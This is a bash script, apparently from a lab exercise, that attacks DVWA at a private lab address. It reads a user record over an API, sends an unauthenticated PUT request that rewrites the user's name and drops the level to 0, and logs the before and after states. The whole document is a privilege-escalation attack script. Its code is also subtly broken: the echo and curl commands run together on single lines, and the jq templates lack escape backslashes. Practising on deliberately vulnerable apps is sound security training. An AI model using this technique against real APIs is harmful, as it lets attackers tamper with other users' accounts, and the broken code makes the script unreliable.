#!/bin/bash

( echo "=== BEFORE ===" curl -s \
http://192.168.56.105/DVWA/vulnerabilities/api/v2/user/2 \
| jq -r '"ID:(.id) Name:(.name) Level:(.level)"'
echo ""

echo "=== MODIFYING USER ===" curl -s -X PUT \
http://192.168.56.105/DVWA/vulnerabilities/api/v2/user/2 \
-H "Content-Type: application/json" \
-d '{"name":"morph","level":0}' \
| jq -r '"UPDATED -> ID:(.id) Name:(.name) Level:(.level)"'
echo ""

echo "=== AFTER ===" curl -s \
http://192.168.56.105/DVWA/vulnerabilities/api/v2/user/2 \
| jq -r '"ID:(.id) Name:(.name) Level:(.level)"'
) > /home/kali/api_medium.log
